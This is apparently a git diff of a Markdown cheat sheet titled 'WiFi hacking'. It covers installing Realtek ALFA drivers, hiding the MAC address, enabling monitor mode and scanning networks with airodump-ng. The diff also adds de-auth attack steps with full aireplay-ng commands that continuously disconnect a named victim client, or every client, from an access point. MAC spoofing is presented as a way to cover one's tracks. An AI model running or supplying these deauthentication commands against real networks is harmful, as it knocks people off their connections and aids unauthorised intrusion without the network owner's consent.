@@ -1,7 +1,15 @@
 # WiFi hacking
 
+## install REaltek drivers 
 
-## Change Mac address for cloacking
+This is a typical wifi SOC within ALFA devices.
+
+
+```bash
+sudo apt install realtek-rtl88xxau-dkms
+```
+
+## Hide your Mac
 
 ```bash
 
@@ -13,8 +21,6 @@ sudo ip link set dev $interface up
 
 ```
 
-## Install Aircrack-ng
-Ensure that Aircrack-ng is installed on your system. It's available for various Linux distributions and can be installed via package managers like apt, yum, or brew.
 
 ## Put Wireless Interface in Monitor Mode
 
@@ -40,7 +46,7 @@ phy0	wlan0		88XXau		Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R 
 
 ```
 
-## Start Scanning for Networks
+## Scanning for Networks
 
 
 ```bash
@@ -72,28 +78,18 @@ ENC: Encryption algorithm used (WEP, WPA, WPA2, etc.).
 ESSID: The name of the Wi-Fi network.
 ```
 
-## Identify connected clients
+
+
+## De-auth attack
+
+### single client
 
 ```bash
+
+# you have to be monitoring specific BSSID on specific channel
 
 sudo airodump-ng --bssid $AP_mac  -c $channel $interface
 
-```
-
-## Start de-auth attack
-
-Start by monitoring specific BSSID and channel
-
-```bash
-
-
-sudo airodump-ng --bssid $AP_mac  -c $channel $interface
-
-```
-
-### Deauth specific client
-
-```bash
 
 sudo aireplay-ng -0 0 -a $AP_mac -c $victim_mac $interface
 
@@ -102,6 +98,6 @@ sudo aireplay-ng -0 0 -a $AP_mac -c $victim_mac $interface
 
 ```
 
-### Deauth all
+### multi clients
 
 `sudo aireplay-ng -0 0 -a $AP_mac  $interface`
